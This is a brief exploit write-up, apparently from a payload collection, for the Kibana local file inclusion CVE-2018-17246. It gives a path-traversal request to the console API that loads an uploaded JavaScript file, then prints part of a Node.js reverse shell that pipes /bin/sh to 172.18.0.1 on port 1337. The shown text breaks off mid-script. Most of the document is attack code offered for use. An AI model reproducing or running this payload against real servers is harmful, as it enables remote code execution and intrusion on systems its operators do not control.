# CVE-2018-17246 - Kibana LFI < 6.4.3 & 5.6.13

A Local File Inclusion on Kibana found by [CyberArk Labs](https://www.cyberark.com/threat-research-blog/execute-this-i-know-you-have-it/), the LFI can be use to execute a reverse shell on the Kibana server with the following payload:
```
/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../.../../../../path/to/shell.js
```
As you already guest, this attack need to be paired with an unrestricted file upload or any other vulnerability that allows you to write a file on the server.

> There is no input validation so we can change the name of the JavaScript file to anything we want. In this case, with the path traversal technique, we can choose any file on the Kibana server.

    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(1337, "172.18.0.1", function(){

        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
